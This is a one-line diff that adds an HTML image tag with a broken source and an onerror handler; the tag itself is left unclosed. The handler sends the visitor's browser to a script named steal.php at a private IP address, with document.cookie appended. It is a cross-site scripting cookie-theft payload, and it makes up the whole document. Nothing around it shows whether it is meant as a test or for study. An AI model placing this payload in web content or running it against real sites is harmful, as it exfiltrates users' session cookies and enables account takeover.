@@ -1,0 +1,1 @@
+<img src="notaurl" onerror="window.location = 'http://10.0.1.2/steal.php?cookie=' + document.cookie;"
